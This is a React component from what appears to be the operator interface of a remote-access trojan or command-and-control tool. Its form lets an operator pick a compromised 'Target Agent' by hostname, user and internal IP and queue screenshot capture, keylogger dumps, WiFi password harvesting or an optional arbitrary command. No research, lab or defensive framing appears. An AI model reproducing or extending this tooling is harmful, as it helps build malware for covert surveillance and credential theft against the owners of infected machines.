import React, { useState } from 'react';
import { useMutation, useQueryClient } from '@tanstack/react-query';
import { Zap, Loader } from 'lucide-react';
import toast from 'react-hot-toast';
import { Button } from '../common/Button';
import { Card } from '../common/Card';
import { tasksApi } from '../../lib/api';

interface CreateTaskFormProps {
  agents: any[];
  onSuccess?: () => void;
}

const TASK_TYPES = [
  {
    value: 'screenshot',
    label: 'Screenshot',
    description: 'Capture screen',
    requiresCommand: false,
  },
  {
    value: 'keylog_dump',
    label: 'Keylog Dump',
    description: 'Download keylog file',
    requiresCommand: false,
    warning: '⚠️ Only works if keylogger was already started via Agent Details',
  },
  {
    value: 'credentials',
    label: 'Credentials',
    description: 'Harvest WiFi passwords',
    requiresCommand: false,
  },
];

export function CreateTaskForm({ agents, onSuccess }: CreateTaskFormProps) {
  const queryClient = useQueryClient();
  
  const [selectedAgent, setSelectedAgent] = useState('');
  const [taskType, setTaskType] = useState('');
  const [command, setCommand] = useState('');
  const [priority, setPriority] = useState(5);

  const createTaskMutation = useMutation({
    mutationFn: (data: any) => tasksApi.create(data),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['tasks'] });
      toast.success('Task created successfully');
      
      // Reset form
      setSelectedAgent('');
      setTaskType('');
      setCommand('');
      setPriority(5);
      
      onSuccess?.();
    },
    onError: (error: any) => {
      toast.error(error.response?.data?.detail || 'Failed to create task');
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedAgent || !taskType) {
      toast.error('Please select an agent and task type');
      return;
    }

    const selectedTaskType = TASK_TYPES.find(t => t.value === taskType);
    
    if (selectedTaskType?.requiresCommand && !command.trim()) {
      toast.error('This task type requires a command');
      return;
    }

    createTaskMutation.mutate({
      agent_id: selectedAgent,
      task_type: taskType,
      command: command.trim() || undefined,
      priority,
    });
  };

  const selectedTaskType = TASK_TYPES.find(t => t.value === taskType);

  return (
    <Card>
      <div className="flex items-center gap-3 mb-6">
        <div className="p-3 bg-primary-500 rounded-lg">
          <Zap className="w-6 h-6 text-white" />
        </div>
        <div>
          <h3 className="text-xl font-bold text-dark-900">Create Special Task</h3>
          <p className="text-sm text-dark-600">
            Queue screenshot, keylog dump, or credential harvest
          </p>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Agent Selection */}
        <div>
          <label className="block text-sm font-medium text-dark-900 mb-2">
            Target Agent
          </label>
          <select
            value={selectedAgent}
            onChange={(e) => setSelectedAgent(e.target.value)}
            className="w-full px-4 py-3 bg-dark-50 border border-dark-200 rounded-lg 
                     text-dark-900 focus:outline-none focus:ring-2 focus:ring-primary-500"
            required
          >
            <option value="">Select an agent...</option>
            {agents.map((agent) => (
              <option key={agent.id} value={agent.id}>
                {agent.hostname} ({agent.username}@{agent.internal_ip})
              </option>
            ))}
          </select>
        </div>

        {/* Task Type Selection */}
        <div>
          <label className="block text-sm font-medium text-dark-900 mb-2">
            Task Type
          </label>
          <div className="space-y-2">
            {TASK_TYPES.map((type) => (
              <div key={type.value}>
                <button
                  type="button"
                  onClick={() => setTaskType(type.value)}
                  className={`w-full text-left px-4 py-3 rounded-lg border-2 transition-all ${
                    taskType === type.value
                      ? 'border-primary-500 bg-primary-50'
                      : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                  }`}
                >
                  <div className="font-semibold text-dark-900">{type.label}</div>
                  <div className="text-sm text-dark-600">{type.description}</div>
                  {type.warning && taskType === type.value && (
                    <div className="mt-2 text-xs text-yellow-700 bg-yellow-50 border border-yellow-200 rounded px-2 py-1">
                      {type.warning}
                    </div>
                  )}
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Command Input (if required) */}
        {selectedTaskType?.requiresCommand && (
          <div>
            <label className="block text-sm font-medium text-dark-900 mb-2">
              Command
            </label>
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              placeholder="Enter command..."
              className="w-full px-4 py-3 bg-dark-50 border border-dark-200 rounded-lg 
                       text-dark-900 placeholder-dark-400 focus:outline-none focus:ring-2 
                       focus:ring-primary-500"
              required={selectedTaskType.requiresCommand}
            />
          </div>
        )}

        {/* Optional Command Input */}
        {!selectedTaskType?.requiresCommand && taskType && (
          <div>
            <label className="block text-sm font-medium text-dark-900 mb-2">
              Command (Optional)
            </label>
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              placeholder="Leave empty for default"
              className="w-full px-4 py-3 bg-dark-50 border border-dark-200 rounded-lg 
                       text-dark-900 placeholder-dark-400 focus:outline-none focus:ring-2 
                       focus:ring-primary-500"
            />
            <p className="mt-1 text-xs text-dark-500">
              Most tasks work with default settings
            </p>
          </div>
        )}

        {/* Priority Slider */}
        <div>
          <label className="block text-sm font-medium text-dark-900 mb-2">
            Priority: {priority}
          </label>
          <input
            type="range"
            min="1"
            max="10"
            value={priority}
            onChange={(e) => setPriority(parseInt(e.target.value))}
            className="w-full h-2 bg-dark-200 rounded-lg appearance-none cursor-pointer accent-primary-500"
          />
          <div className="flex justify-between text-xs text-dark-500 mt-1">
            <span>Low (1)</span>
            <span>High (10)</span>
          </div>
        </div>

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={createTaskMutation.isPending || !selectedAgent || !taskType}
          className="w-full"
        >
          {createTaskMutation.isPending ? (
            <>
              <Loader className="w-5 h-5 mr-2 animate-spin" />
              Creating...
            </>
          ) : (
            <>
              <Zap className="w-5 h-5 mr-2" />
              Create Task
            </>
          )}
        </Button>
      </form>
    </Card>
  );
}